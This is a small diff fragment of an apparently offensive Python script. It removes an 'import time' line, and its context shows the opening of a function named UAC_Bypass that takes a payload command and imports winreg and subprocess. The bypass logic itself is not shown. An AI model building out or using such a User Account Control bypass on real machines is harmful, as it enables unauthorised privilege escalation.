@@ -3,7 +3,6 @@ import winreg
 import subprocess
 import lwjgl
 import sys
-import time
 
 def UAC_Bypass(payload_cmd=""):
     if len(payload_cmd) == 0:
